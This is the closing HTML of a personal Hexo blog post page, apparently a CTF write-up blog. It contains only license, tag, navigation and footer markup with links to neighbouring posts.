                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span></span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/Writeup/"># Writeup</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2019/10/28/algorithm-experiment-review/">算法实验考试复习</a>
            
            
            <a class="next" rel="next" href="/2019/10/21/RoarCTF-Web-Writeup/">RoarCTF_Web_Writeup</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Lethe | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>